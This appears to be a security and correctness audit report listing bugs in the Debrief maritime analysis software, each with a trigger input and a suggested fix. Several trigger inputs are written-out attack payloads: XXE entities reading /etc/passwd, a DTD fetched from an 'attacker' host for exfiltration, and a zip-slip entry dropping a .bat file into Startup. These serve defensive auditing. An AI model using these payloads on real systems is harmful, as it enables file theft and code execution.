title: readThisDouble accepts partial numbers, maps NaN to 0, and attribute parse er...
description: readThisDouble() uses DecimalFormat.parse(), which parses only the longest valid prefix and ignores the remainder, so '1.2E1' becomes 1.2, '12abc' becomes 12 and exponent-notation values written by other tools are silently truncated; 'NaN' is silently turned into 0 (course north). When parsing does fail, HandleDoubleAttribute/HandleDateTimeAttribute and handleOurselves() catch the exception, log it to the trace file and continue, so the attribute silently keeps its default (0, previous value or null) and the user sees a complete-looking plot with wrong numbers. All Debrief/ASSET XML numeric attributes go through this path.
trigger_input: <fix Course="9.0E1" Speed="1.2E1" .../> in a .dpf: imported with course 9 deg and speed 1.2 kts instead of 90 deg and 12 kts, no user-visible warning
suggested_fix: Use ParsePosition and reject input with unconsumed characters (or Double.parseDouble after normalising the decimal separator); accumulate attribute errors and surface them to the user at end of import instead of trace-only logging.
llm_value: Required knowing DecimalFormat's prefix-parse semantics and following how the handler base class swallows exceptions; not detectable by grep.

title: SAX parser for .dpf/.xml/.asf import resolves external entities and DTDs
description: getConfiguredParser() returns SAXParserFactory.newInstance().newSAXParser() with no hardening: disallow-doctype-decl, external-general-entities, external-parameter-entities and load-external-dtd are all left at JDK defaults (enabled), and the hardening lines are commented out. Every Debrief plot (.dpf/.xml), ASSET scenario/control file (.asf) and NaturalEarth store goes through doImport(), so a crafted file can read local files into attribute values and exfiltrate them via a parameter-entity SYSTEM URL, or make the parser fetch arbitrary URLs. Entity-expansion bombs are bounded only by the JDK's default jdk.xml limits since FEATURE_SECURE_PROCESSING is never set explicitly.
trigger_input: .dpf beginning <!DOCTYPE plot [<!ENTITY % p SYSTEM "http://attacker/x.dtd"> %p;]> or <!ENTITY xxe SYSTEM "file:///etc/passwd"> used inside a Label attribute
suggested_fix: In getConfiguredParser set factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING,true), http://apache.org/xml/features/disallow-doctype-decl=true (or the two external-entities features false and load-external-dtd false) and set an EntityResolver that rejects external ids; do the same for ASSETReaderWriter which reuses doImport.
llm_value: grep-able for the factory call, but confirming that every importer (Debrief plot, ASSET, NaturalEarth) funnels through this one unhardened doImport needed tracing the class hierarchy.

title: Unparseable Lat/Long silently produces a position at 0,0
description: handleOurselves() resets _lat/_long/_depth to 0.0 then parses each attribute; a ParseException is caught and only traced, so elementClosed() still builds a WorldLocation, placing the fix/shape on the equator/prime meridian with no user warning. Combined with readThisDouble's prefix parsing, values such as '5.0E1' silently become 5.0 degrees.
trigger_input: <shortLocation Lat="N50.5" Long="-1.2" Depth="0"/> loads as latitude 0.0
suggested_fix: Track parse failure and skip the element (or throw) instead of emitting a default location; report to the user.
llm_value: Needs reading the reset-then-parse-then-construct sequence across two methods.

title: GPX import via JDOM SAXBuilder and schema Validator with default entity handling
description: getDocumentSource() parses the GPX file with new SAXBuilder() (JDOM default: expandEntities=true, external entities resolved) and isValid() re-parses the file with a javax.xml.validation Validator that is also left at defaults. Both are reached from JaxbGpxHelper.unmarshall() for every .gpx opened, so a GPX file can trigger XXE twice. || getDocumentSource builds the GPX document with new SAXBuilder() and no feature hardening, so external general/parameter entities and external DTDs are resolved before schema validation runs (validation happens afterwards on the already-expanded JDOM tree). Entity content flows into track/waypoint names via JAXB unmarshalling, giving local file disclosure and SSRF-style outbound requests from a data file.
instances: L64-L72; L86-L91; L101-L118; L120-L140; L137-L140 (JaxbGpxHelper.unmarshall consumes the source)
trigger_input: .gpx with <!DOCTYPE gpx [<!ENTITY x SYSTEM "file:///etc/passwd">]><gpx version="1.1"><trk><name>&x;</name>...
suggested_fix: Create SAXBuilder(XMLReaders.NONVALIDATING) and set the external-entity/doctype features false; on the Validator set ACCESS_EXTERNAL_DTD and ACCESS_EXTERNAL_SCHEMA to empty strings.
llm_value: Needed to know JDOM's default entity behaviour and follow the call chain from JaxbGpxHelper to see the file is parsed twice.

title: KML/KMZ DOM parse uses unhardened DocumentBuilderFactory
description: doImport() builds a DocumentBuilderFactory with defaults and parses the whole (untrusted) KML text with loader.parse(); doctype declarations and external general/parameter entities are allowed, so a KML or the .kml entry of a KMZ can read local files or make network requests. The pre-pass stripNonValidXMLCharacters does nothing to entities.
trigger_input: .kml containing <!DOCTYPE kml [<!ENTITY x SYSTEM "file:///etc/hostname">]> and <name>&x;</name> inside a Placemark
suggested_fix: Set FEATURE_SECURE_PROCESSING, disallow-doctype-decl, setExpandEntityReferences(false) and setXIncludeAware(false) on the factory.
llm_value: grep-able

title: KML import assumes a fixed radar-plot layout; any other KML throws unchecked ...
description: For every Placemark with a MultiGeometry the code calls getElementsByTagName(...).item(0).getTextContent() for name/when/coordinates/description without null checks, Integer.parseInt on the first '-' token of the name, indexes coords[2], and substring(startI+7,endI-1) in courseFrom/speedFrom; the LineString branch does fileName.substring(1,len-1) and StringTokenizer.nextToken() three times per point. NPE/NumberFormatException/ArrayIndexOutOfBounds/NoSuchElementException are not in the catch list (L256-L264), so they escape doImport and doZipImport uncaught. Also getElementsByTagName never returns null so the lineString != null test is always true.
trigger_input: Any Google-Earth KML whose Placemark has a MultiGeometry but a <name> of 'Ship A' or coordinates 'lon,lat' without altitude; or a KML with 2 coordinate tokens per point
suggested_fix: Null-check each lookup, validate token counts, catch RuntimeException per Placemark and report a summary to the user.
llm_value: Needs understanding of DOM API semantics (item(0) null, getElementsByTagName non-null) and the exception flow.

title: KMZ entries inflated fully into memory with no size cap
description: doZipImport() copies every '*.kml' entry byte-by-byte into a ByteArrayOutputStream with no limit on inflated size or entry count, then doImport() re-materialises it as a String (2 bytes/char) plus a stripped copy and a DOM, so peak memory is 5-6x the inflated size. A small KMZ with a highly compressible KML entry exhausts the JVM heap (OutOfMemoryError) and takes down the workbench job. Reached through KMLLoader for any *.kmz opened or dropped.
trigger_input: A 1 MB .kmz containing a.kml that inflates to 2 GB of spaces/comments.
suggested_fix: Track bytes read per entry and abort above a budget (e.g. 256 MB); stream the entry straight into the SAX/DOM parser instead of buffering; use a buffered read(byte[]) loop.
llm_value: Needed to follow the multiple in-memory copies across doZipImport/inputStreamAsString/stripNonValidXMLCharacters to size the amplification.

title: GZIP payload inflated fully into memory with no cap (gzip bomb)
description: doZipImport() reads the entire GZIPInputStream one byte at a time into a ByteArrayOutputStream before parsing. gzip compresses runs ~1000:1, so a 10 MB .csv.gz can inflate to ~10 GB and OOM the workbench; the byte-at-a-time loop also makes legitimate multi-hundred-MB files extremely slow. On exception the GZIPInputStream is not closed and the failure is only printStackTrace()d.
trigger_input: A small .csv.gz whose payload is gigabytes of repeated characters, opened via the CSV_GZ loader.
suggested_fix: Wrap the GZIPInputStream in a BufferedReader and feed doImport() line by line with a running byte budget; never buffer the whole file; close in finally and report errors.
llm_value: grep-able

title: Time box labels taken from an arbitrary first track and ignore its stepsToSkip
description: createTimeNarrativeShapes() builds the animated time captions from trackData.getTracks().get(0) only (L542) and schedules them from delay 0 (L556) with one step per point (L537, L590). The track list comes from CoreCoordinateRecorder._tracks, a HashMap (order depends on name hashes), so the 'first' track may be one that started late (stepsToSkip>0) or ended early. Its first point's timestamp is then shown at t=0 while the markers for that time appear stepsToSkip*interval later, and no captions exist after the shorter track ends. The exported PPTX shows wrong times for the displayed positions.
instances: L530-L600 (esp. L537; L542; L556); CoreCoordinateRecorder.java L190; L283; L352-L354
trigger_input: Record a PPTX export where track B becomes visible several steps after track A and B hashes before A: the time caption reads B's first DTG while A is still at its earlier positions.
suggested_fix: Keep the recorder's _times list (one DTG per step) in TrackData and generate one caption per step from it, with delay = stepIndex*interval; do not derive captions from a track.
llm_value: Requires following the data flow from the HashMap in the recorder through the exporter to see that ordering and stepsToSkip both change the visible result.

title: PPTX template extracted with zip4j 1.3.2 extractAll, no entry-name canonical ...
description: unpackFunction() hands the user-selected 'master template' .pptx to net.lingala.zip4j.core.ZipFile.extractAll(). zip4j 1.3.2 (bundled in libs/) predates the Zip Slip fix and writes each entry to outPath + entryName without verifying the canonical path stays under outPath (I inspected the bundled UnzipEngine class: no getCanonicalPath/illegal-name check). Entry names such as ../../../../Users/x/AppData/Roaming/... therefore write arbitrary files. Reached from PrefsPage.updateDimensions() as soon as a template path is typed, from ExportPPTDialog.okPressed() (validateDonorFile) and from every PPTX export.
instances: L67-L68; PlotTracks.java L155; org.mwc.debrief.core PrefsPage.java L182
trigger_input: A .pptx (zip) whose entry names include ../ segments, e.g. '../../../startup/evil.bat', selected as the PowerPoint master template in Preferences (or distributed as a 'corporate template').
suggested_fix: Upgrade zip4j to >= 2.x (API changed) or iterate FileHeaders and reject any entry whose File(outPath,name).getCanonicalPath() does not start with outPath's canonical path before extractFile(). Also cap total extracted size.
llm_value: Needed to trace that the template path flows from a preference/dialog into a library call, and to check the bundled jar version's UnzipEngine for the missing canonical-path guard.

title: Clipboard bytes deserialized with unfiltered ObjectInputStream (EditableTrans...
description: EditableTransfer.nativeToJava wraps the raw byte[] pulled from the system clipboard (SWT type name CMAP_EDITABLE, L519) in a plain ObjectInputStream and calls readObject() with no ObjectInputFilter, class allowlist or size limit. Any other process on the desktop (or an RDP/VNC/browser clipboard-sync peer) can place bytes under that type name, so a Paste, or even a Cut (CutItem.rememberPreviousContents L221 reads the clipboard before overwriting it), deserializes attacker-controlled data. The bundle classloader reaches every Serializable class in cmap.core and its required bundles, so both DoS payloads (nested HashSet/serialDOS) and any available gadget chain execute during readObject before the Editable[] cast at L606.
trigger_input: Attacker process calls SetClipboardData/ XSetSelection with format CMAP_EDITABLE containing a serialized SerialDOS object graph; analyst right-clicks Paste (or Cut) in the Outline view.
suggested_fix: Install an ObjectInputFilter (ObjectInputStream.setObjectInputFilter) that allowlists MWC.*/Debrief.* Editable classes, java.lang/java.util basics and arrays, with maxdepth/maxarray/maxbytes limits; alternatively keep the clipboard payload in-process (store the Editable[] in a static and only put an opaque token on the clipboard).
llm_value: Needs reasoning that SWT ByteArrayTransfer contents originate outside the JVM and that Cut also reads the clipboard; a grep for ObjectInputStream finds the line but not the trust boundary.

title: Windows product ships AdoptOpenJDK 11.0.5+10 (Oct 2019) fetched without checksum
description: main.yml L152-157 wget-downloads OpenJDK11U-jre_x64_windows_hotspot_11.0.5_10.zip from the archived AdoptOpenJDK GitHub releases with no SHA256 verification, caches it (L145-150) and bundles it into org.mwc.debrief.combined.feature/win-64/jre (L162-169). Windows users therefore run a JRE missing roughly 25 quarterly CPUs (e.g. CVE-2020-2803/2805 deserialisation, CVE-2020-14583, CVE-2021-2163, CVE-2022-21496 JNDI, CVE-2023-21930 TLS, CVE-2024-21011..21094) while Debrief parses untrusted XML/ZIP/Office files with JDK classes; a tampered download would also be bundled silently. || L156-157 download OpenJDK11U-jre_x64_windows_hotspot_11.0.5_10.zip and L162-169 stage it into org.mwc.debrief.combined.feature/win-64 so it is bundled inside DebriefNG-Windows64Bit.zip and the MSI (contribs/msi/make_x64msi.sh L13 uses the same URL). 11.0.5 predates roughly 25 quarterly CPUs; every released Windows Debrief runs the analyst's untrusted data files on a JRE with dozens of known CVEs (e.g. CVE-2020-2803, CVE-2020-14583, CVE-2021-2163, CVE-2022-21496, CVE-2023-21930, CVE-2024-21011). The cache key `win-jre-11.0.5-10` (L150) pins it further.
instances: .github/workflows/main.yml L145-L157; L162-L169; L145-157; L162-169; contribs/msi/make_x64msi.sh L13
trigger_input: Any release build: the JRE zip is trusted as downloaded; end-user opens a malicious file with the bundled 2019 JRE.
suggested_fix: Pin the latest Temurin 11/17 (or 25 per #5237) via the Adoptium API with the published SHA256 checked (sha256sum -c) or use actions/setup-java's JRE download with checksum, and bump on each release.
llm_value: grep-able for the URL; the impact needed the age comparison and product-bundling step.

title: commons-compress 1.19 zip OOM (CVE-2021-36090) reachable via .docx import
description: commons-compress 1.19 is vulnerable to CVE-2021-36090 (crafted ZIP makes ZipFile/ZipArchiveInputStream allocate huge memory), CVE-2021-35515/35516/35517 (7z, tar infinite loop/OOM) and CVE-2024-25710. It is on the cmap.legacy Bundle-ClassPath (L18) and is the ZIP implementation POI 4.1.2's OPCPackage uses when Debrief opens OOXML files, so it is reachable from MsDocXLoader (.docx) and ImportASWDataDocument (XWPFDocument at L616). Debrief's own use is only GzipUtils filename helpers in Import_CSV_GZ tests.
instances: org.mwc.cmap.legacy/META-INF/MANIFEST.MF L18; org.mwc.debrief.legacy/src/Debrief/ReaderWriter/Word/ImportRiderNarrativeDocument.java L343, L354; org.mwc.debrief.legacy/src/Debrief/ReaderWriter/Word/ImportASWDataDocument.java L616; org.mwc.debrief.core/plugin.xml L228
trigger_input: A .docx whose ZIP central directory is crafted per CVE-2021-36090 opened via File > Open (extension docx).
suggested_fix: Upgrade commons-compress to 1.26.x+ together with POI 5.x (POI 5 requires commons-compress 1.21+).
llm_value: Required knowing POI delegates OOXML zip handling to commons-compress; OSV alone flags the jar but not the .docx path.

title: Xuggler 4.0.1084 (2011) ships unpatched native FFmpeg for analyst media
description: xuggle-xuggler.jar (Implementation-Version 4.0.1084, built 2011, project abandoned 2013) wraps native libavcodec/libavformat from the FFmpeg 0.x era via jni_helper.jar and is loaded by NativeLibrariesLoader; PlayingThread L228 IContainer.make() opens whatever video/audio file the analyst attaches to a plot. Every FFmpeg memory-safety CVE published since 2011 therefore applies to the shipped natives and no update is possible. Plugin is shipped in org.mwc.cmap.combined.feature.
trigger_input: A crafted .avi/.mp4 opened in the Debrief media player view.
suggested_fix: Replace Xuggler with JavaFX Media, VLCJ (system libvlc) or a maintained javacv/ffmpeg-platform artifact that is updated with the build; or drop video playback.
llm_value: No Maven coordinates exist so OSV/Dependabot cannot flag it; needed manifest inspection and knowing Xuggler embeds FFmpeg natives.

title: JDOM 1.0 SAXBuilder (CVE-2021-33813) parses untrusted .gpx with XXE enabled
description: JDOM before 2.0.6.1 (CVE-2021-33813) resolves external entities by default and has no safeguards; jdom-1.0.jar dates from 2004. GpxUtil.getDocumentSource builds a default SAXBuilder (L87) and parses the GPX file stream (L88) for every GPX import registered at plugin.xml L176, so a hostile .gpx can exfiltrate local files via an external DTD/entity or trigger billion-laughs.
trigger_input: .gpx starting with <!DOCTYPE gpx [<!ENTITY xxe SYSTEM "file:///etc/passwd">]> and using &xxe; in a <name> element
suggested_fix: Replace with the platform JAXP parser (secure-processing on, disallow-doctype-decl) or JDOM 2.0.6.1 with builder.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true); setExpandEntities(false).
llm_value: grep-able for SAXBuilder; the dependency-age link is what makes it a supply-chain row.

title: PDFBox 2.0.3 (2016) DoS/infinite-loop CVEs reachable via .pdf import
description: pdfbox 2.0.3 and fontbox 2.0.3 are subject to CVE-2018-8036 (infinite loop in AFM parser), CVE-2018-11797 (infinite loop in crafted PDF), CVE-2021-27807/27906 (infinite loop / OOM loading PDF) and CVE-2021-31811/31812 (OOM and infinite loop). PDDocument.load(inputStream) is called on any file the analyst opens via PdfLoader (registered for extension pdf in org.mwc.debrief.core/plugin.xml L232), so a crafted PDF hangs or crashes the workbench.
instances: org.mwc.debrief.legacy/META-INF/MANIFEST.MF L7, L9; Debrief/ReaderWriter/Word/ImportNarrativeDocument.java L1901-L1905; org.mwc.debrief.core/plugin.xml L232; org.mwc.debrief.core/src/org/mwc/debrief/core/loaders/PdfLoader.java L39-L40
trigger_input: Drag a PDF crafted per CVE-2021-31812 (self-referencing page tree) onto the plot; PDFTextStripper never returns.
suggested_fix: Upgrade pdfbox/fontbox to 2.0.31+ (drop-in for the 2.0 API) or 3.0.x; run the import in a cancellable Job with a timeout.
llm_value: grep-able once the version is known; reachability needed reading the loader registration.

title: zip4j 1.3.2 zip-slip: extractAll() on user-chosen .pptx template
description: zip4j 1.3.2 (2015) has no path-traversal check in ZipFile.extractAll (CVE-2018-1002202) plus DoS on crafted archives (CVE-2022-24615) and skipped integrity checks (CVE-2023-22899). Debrief.ReaderWriter.powerPoint.UnpackFunction L67-68 calls new ZipFile(pptx_path).extractAll(unpack_path) on the PowerPoint export template the analyst picks in Preferences (org.mwc.debrief.core PrefsPage L115-119, invoked at L180), so a crafted template writes files anywhere the user can write. Referenced by MANIFEST.MF L17 and shipped.
trigger_input: A .pptx 'template' sent to an analyst containing an entry named ../../../../Users/<user>/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/x.bat, selected in Preferences > Debrief > PPT template
suggested_fix: Upgrade to net.lingala.zip4j:zip4j 2.11.5+ (API changed: package net.lingala.zip4j.ZipFile) and additionally canonicalise each entry path against the target directory before extraction.
llm_value: Needed tracing PrefsPage -> PlotTracks -> UnpackFunction to show the archive is user-supplied rather than a build artefact.

title: Default earth model does not wrap longitude across the antimeridian
description: subtract() forms DELTA_LONG = LONG2 - LONG1 with no normalisation to [-pi,pi], and add() writes NEW_LONG without wrapping to [-180,180]. FlatEarth is the lazily-installed default model in WorldLocation, so every rangeFrom/bearingFrom crossing 180 deg longitude goes the long way round. Verified by compiling: rangeFrom((0,179.9E),(0,179.9W)) = 359.8 deg instead of 0.2 deg, bearing reversed. CompletelyFlatEarth (L195-L202) has the same defect.
trigger_input: .rep track with consecutive fixes at 179.95E and 179.95W: leg length, speed-over-ground, range/bearing tote and TMA solutions computed from these fixes are wrong by ~360 deg of arc; fit-to-window covers the whole globe.
suggested_fix: Normalise DELTA_LONG to (-pi,pi] in subtract() (e.g. Math.atan2(sin,cos) or add/subtract 2pi) and wrap NEW_LONG in add(); mirror in CompletelyFlatEarth.
llm_value: The invariant (longitude is cyclic) is domain knowledge; the arithmetic is otherwise well formed so no static rule flags it.

title: perpendicularDistanceBetween ignores cos(lat): cross-track distance wrong
description: perpendicularDistanceBetween/rangeFrom(lineStart,lineEnd) builds Point2D from raw (long,lat) degrees and returns the Euclidean distance as WorldDistance.DEGS, so a longitude degree is weighted like a latitude degree regardless of latitude, and the result ignores the configured EarthModel. Verified by compiling the class: at 60N a point 1 deg of longitude east of a N-S segment reports 60.0 nm off-track where the true separation (same class, rangeFrom) is 30.0 nm; error is a factor 1/cos(lat) in the cross-track direction. Consumers include org.mwc.cmap.xyplot LocationCalculator (cross-track xy plots), SensorContactWrapper bearing-line hit testing and PolygonShape.
trigger_input: Track at 60N, LocationCalculator cross-track distance of a fix 1 deg longitude off a north-south leg: reports 60 nm instead of 30 nm.
suggested_fix: Scale x by cos(mean latitude) before the segment projection (or project via the EarthModel / rangeFrom with a great-circle cross-track formula) and only accept the inline test after switching it away from CompletelyFlatEarth, which currently masks the error.
llm_value: Requires knowing that WorldDistance.DEGS means degrees of arc along a great circle (as returned by rangeFrom) while the code mixes it with a Euclidean degree distance; the inline test passes because it forces CompletelyFlatEarth.

title: Two-digit-year export/parse window and negative-epoch formatting corrupt DTGs
description: toString/toStringHiRes emit yyMMdd (two-digit year) and parseThis parses two-digit years with SimpleDateFormat's default pivot (now-80y .. now+20y), so any DTG outside that moving window is silently rewritten on a write/read round trip and the result depends on the machine date. Verified by compiling: 1945-01-01 -> "450101 000000" -> 2045-01-01; 2050-01-01 -> "500101 000000" -> 1950-01-01. Separately, for pre-1970 instants theVal % 1000 > 0 and micros % 1000 > 0 are false for negative remainders and wholeSeconds truncates toward zero, so 1969-12-31 23:59:59.500 is written as "700101 000000" and "691231 235959" (millis dropped). || parseThis picks TWO_DIGIT_YEAR_FORMAT ('yyMMdd HHmmss') whenever the date token is 6 digits. SimpleDateFormat maps yy into the window [now-80y, now+20y] fixed when the static formatter was created. Verified on 2026-09-23: '450101' -> 2045 but '470101' -> 1947; in 2028 the same file's '470101' flips to 2047. Historical REP data from before 1946 is already mis-dated, and any file with dates more than 20 years ahead silently lands a century early; nothing warns the user.
trigger_input: Export a historical (WWII) or long-range planning track to .rep or to any XML attribute written via toStringHiRes and re-import it: all fixes move by 100 years.
suggested_fix: Write four-digit years (yyyyMMdd) everywhere and, when parsing yy, call set2DigitYearStart with a fixed epoch documented in the format spec; use Math.floorMod/floorDiv for the sub-second arithmetic.
llm_value: Needs knowledge of SimpleDateFormat's date-dependent two-digit-year pivot and of Java's sign-preserving % operator; the code reads as correct.

title: compareTo returns 1 for equal-time cuts; TreeSet remove silently fails
description: compareTo() returns 1 whenever DTGs are equal and the object is not the same instance (and when _DTG is null). This violates the Comparable contract, so once the TreeSet rebalances, TreeSet.remove()/contains() navigate past equal-time siblings and fail (verified: 4 equal-time items, remove of the first returns false while the item remains in the set). TacticalDataWrapper.removeElement ignores the boolean result, so deleting such a cut silently does nothing while the UI reports success. Same pattern in TMAContactWrapper L573-L599 and DynamicTrackShapes.DynamicTrackShapeWrapper L199-L225.
trigger_input: REP/DPF sensor with three or more cuts sharing one DTG (e.g. multi-target sonar at the same second), then delete one of them from the Outline view
suggested_fix: Break ties deterministically (e.g. by identityHashCode or an insertion sequence number stored in the cut) so compareTo is antisymmetric and transitive, or switch the container to a list keyed by time.
llm_value: Requires understanding red-black tree navigation with a non-antisymmetric comparator; the code comments assert the opposite of what happens.

title: createItem interpolates radians against a 180-degree wrap threshold
description: TMAContactWrapper.getCourse()/getBearingRads() return radians, but LinearInterpolator.interp's wrap check compares the difference with 180, so a course change from 350 to 10 degrees is interpolated the long way (midpoint 180 degrees, verified) and then converted with Rads2Degs. Resampled TMA solutions get wrong target course and wrong bearing for range/bearing-defined solutions.
trigger_input: TMA solution whose consecutive entries have courses 350 and 010 (or bearings either side of north), then 'Resample data at' on the TMA layer
suggested_fix: Interpolate in degrees (_targetCourseDegs) or convert to degrees before calling interp; add a unit test crossing north.
llm_value: Needs the unit of getCourse() on TMAContactWrapper and the threshold inside a helper in another class; not grep-able.

title: LinearInterpolator applies 360-degree wrap to range, frequency and depth
description: LinearInterpolator.interp() unconditionally treats any pair whose difference exceeds 180 as an angle and subtracts 360 from values above 180. It is used by SensorWrapper.createItem for range (yards/metres) and frequency (Hz) and by TMAWrapper.createItem for depth, speed, minima/maxima, so resampling sensor or TMA data with ranges like 100->5000 yds or frequencies like 150->400 Hz produces silently wrong interpolated values (verified: 100..5000 midpoint = 2370 instead of 2550). Also _timeDelta==0 (two cuts at the same DTG, which compareTo allows) gives an Infinity gradient.
instances: L119; L125-L140; SensorWrapper L1052; SensorWrapper L1060-L1064; TMAWrapper L507
trigger_input: Sensor with ranged cuts (e.g. 100 yds then 5000 yds) or frequency data spanning >180 Hz, then set 'Resample data at' on the sensor
suggested_fix: Add a separate interpAngle() for bearings/orientation and keep interp() purely linear; guard _timeDelta==0.
llm_value: Only visible by reading which quantities the shared interpolator is applied to; each call site looks correct in isolation.

title: decimateRelativeTMA passes millis to HiResDate micros constructor
description: decimateRelativeTMA receives theStartTime in milliseconds (startMicros = theStartTime*1000L at L751 confirms this) but then constructs new HiResDate(0, theStartTime), whose second argument is microseconds, so startDTG is 1000x too early (1970-era). The RelativeTMASegment offset recomputation via interpolateFix/getNearestTo therefore uses a bogus time, and the leg is renamed with a 1970 DTG via sortOutDateLabel. Reached from TrackWrapper.setResampleDataAt -> seg.decimate -> decimateRelative for CoreTMASegment legs.
trigger_input: Track whose first leg is a RelativeTMASegment, set 'Resample data at' on the parent track in the Properties view
suggested_fix: Use new HiResDate(theStartTime) (millis constructor) or pass startMicros; add a unit test for resampling a relative TMA leg that checks the leg name/offset.
llm_value: Requires tracing the millis/micros convention of theStartTime across three methods and knowing the HiResDate(long,long) signature.

title: Equal-start segments silently dropped by SegmentList (compareTo by startDTG)
description: TrackSegment.compareTo orders solely by startDTG(), and SegmentList (a ConcurrentSkipListSet via Plottables) ignores the boolean from add(), so a second segment whose first fix has the same DTG as an existing segment is silently discarded (verified with ConcurrentSkipListSet: second add returns false). startDTG() is also a mutable key: adding an earlier fix to a segment already in the set (TrackWrapper.addFix always appends to last()) or trimTo() can reorder keys without re-sorting, after which removeElement/first()/last() may target the wrong segment.
trigger_input: Generate a second TMA leg from cuts starting at the same DTG as an existing leg, or group/merge two tracks whose legs start at the same second
suggested_fix: Check the result of super.add() in SegmentList.addSegment and either reject with a message or break ties (name/identity); remove and re-add a segment whenever its start time changes.
llm_value: Requires linking the comparator, the skip-list container semantics in Plottables and the mutable-key mutation paths.

title: calcCourseSpeed sub-second gaps give Infinity; setResampleDataAt divides by 0
description: calcCourseSpeed() computes timeDifference as (micros delta)/1000000 in long arithmetic, so any gap under 1 s becomes 0 and distance/0 yields Infinity (or NaN) which is written into every fix via setSpeed; gaps of 1.9 s are treated as 1 s, inflating speed by up to 2x. 'Calc Course & Speed' is a top-level track menu action, so the wrong speeds are silently persisted and feed TMA/DR reconstruction. Separately, setResampleDataAt computes currentStart / interval (L3360) before the <=0 guard (L3371); the TimeFrequencyPropertyEditor 'None' tag is 0 micros, so selecting it throws ArithmeticException (SensorWrapper.setResampleDataAt guards this correctly); the same method also passes a millis startTime (L3366) to TacticalDataWrapper.decimate which expects micros (harmless only because max() discards it).
trigger_input: Track with 1 Hz-or-faster fixes (e.g. NMEA/AIS at 0.5 s, or jittered 0.9 s), then Track > Calc Course & Speed; or select 'None' in the track's 'Resample data at' property
suggested_fix: Compute the delta as a double in seconds (micros/1e6d), skip or merge fixes with zero delta, and guard against non-finite results before setSpeed; move the <=0 interval check above the division and pass micros to decimate.
llm_value: Needs reasoning about integer vs floating division and the microsecond units of HiResDate; a grep for '/ 1000000' cannot tell which divisions are integer.

title: Domain fold subtracts 180 instead of 360; PermScore folds only once
description: In sliceSensorIntoLegsUsingAmbiguity the ambiguous-minus-core delta step is folded with 'valueDelta -= 180d' for the >180 case but '+= 360d' for the <-180 case. A 360-domain jump of +350 becomes +170 instead of -10, giving a huge gapRate that exceeds minZig and falsely ends the current leg / starts a zig (python: 350->170, correct -10; 190->10, correct -170). Separately PermScore (L135-L140) folds the difference of two unwrapped curve values only once, so differences beyond +/-540 are mis-scored.
trigger_input: Towed-array cut pair on a steady leg where (ambig-core) delta moves from -175 to +178 (domain flip) while thisLeg != null: valueDelta=353 -> 173 deg, gapRate>0.5 deg/s -> spurious zig.
suggested_fix: Use 'valueDelta -= 360d' (or a shared shortAngle() helper) and make PermScore fold with a while loop or ((x+180)%360+360)%360-180.
llm_value: Only visible by checking the two branches of the fold are symmetric and by reasoning about the unwrapped-domain range of curve outputs.

title: Course unwrap typo: 'heading - heading > 180' never true, so northerly crossi...
description: collateData() is meant to unwrap ownship courses across 0/360 before the steady-course statistics run, but the second branch compares heading with itself (always 0) instead of with previousHeading. Only the 359->1 direction is unwrapped; a 1->359 step is left as a 358 degree jump, so max-min range, stdev and regression tests in SCAlgorithms all fail and the steady-heading interval is broken or never detected. This is the production ownship leg slicer (StackedDotHelper.sliceOwnship uses AlternateLegWrapper whenever the course data is not artificial).
trigger_input: Ownship track steering ~000 with normal jitter, e.g. courses 002, 358, 001, 359 (python check: [5,355,5,350] -> [5,355,365,350], first step left as 350 jump)
suggested_fix: Change the second condition to 'heading - previousHeading > 180.0'; add a unit test with courses oscillating either side of north and assert a single steady leg.
llm_value: Needs reading the intent of the two-branch unwrap to notice the self-comparison; a linter might flag x-x but not the algorithmic consequence.

title: readThisDouble silently truncates comma-decimal and garbage-suffixed numbers
description: readThisDouble parses with a Locale.UK DecimalFormat first and only falls back to the comma (FRANCE) format on ParseException. DecimalFormat.parse is a prefix parser: it never throws for '22,5', '12.5abc', '1e5' or '22 10', so the comma fallback is unreachable and the value is silently truncated (verified with JDK 21: '22,5'->22.0, '239,9'->239.0, '1e5'->1.0, '12.5abc'->12.5). Every REP line importer (ImportFix lat/lon/course/depth, sensors, TMA, shapes) relies on this helper, so a European-formatted REP file yields wrong positions/courses with no error.
trigger_input: REP fix line '951212 051600 NELSON @C 22 10 53,54 N 21 45 14,20 W 239,9 2.0 0' (comma decimals) imports as 53 s / 14 s / 239 deg with no warning
suggested_fix: Parse with ParsePosition and require pos.getIndex()==trimmed.length(); if the UK parse does not consume the whole token, try the comma format, else throw ParseException. Alternatively use Double.parseDouble after normalising the decimal separator.
llm_value: Requires knowing DecimalFormat.parse prefix semantics and tracing that the comma fallback branch is dead; not grep-able.

title: Antares course (degrees) and speed (knots) stored raw as Fix radians / yards-...
description: loadThisLine parses course, speed and depth with Double.parseDouble and passes course and speed straight into new Fix(date, location, course, speed). Fix stores course in radians and speed in yards/sec (every other importer converts, e.g. ImportFix L846-847 Degs2Rads/Kts2Yps). A course of 30 in the file becomes 30 rad (=1718 deg mod 360 = 278 deg) and 2 kts becomes 2 yps (=3.55 kts). ImportAntaresTest L72-74 asserts fixWrapper.getCourse()==30 and getFix().getSpeed()==2, enshrining the wrong units.
trigger_input: 'TRACK/010530Z/2512.0N-03010.5W/30/2/-5//' imports with course 278.3 deg and speed 3.55 kts
suggested_fix: Convert: Conversions.Degs2Rads(course) and Conversions.Kts2Yps(speed) (confirm file units with the format spec), and fix the unit test expectations.
llm_value: Requires knowing the Fix constructor's unit contract; the code compiles and tests pass.

title: Radar log timestamps parsed with 12-hour 'hh': PM records dropped, noon recor...
description: getDate builds a non-lenient GMTDateFormat('yyMMdd_hhmmss'); 'hh' is the 1-12 clock-hour field. Verified on JDK 21: '700101_130601' and '700101_000601' throw ParseException (readLine returns Optional.empty and the record is silently dropped, only System.out), while '700101_120601' parses as 00:06:01, i.e. noon records are placed 12 hours early. Any $RATTM log covering 12:00-23:59 or 00:00-00:59 loses or misplaces contacts.
suggested_fix: Use pattern 'yyMMdd_HHmmss'. Also report skipped lines through the ErrorLogger instead of System.out.
llm_value: Requires knowing SimpleDateFormat hh vs HH semantics with lenient=false; a regex grep would not flag it.

title: UNIT month parsed with default-locale SimpleDateFormat('MMMyy'); non-English ...
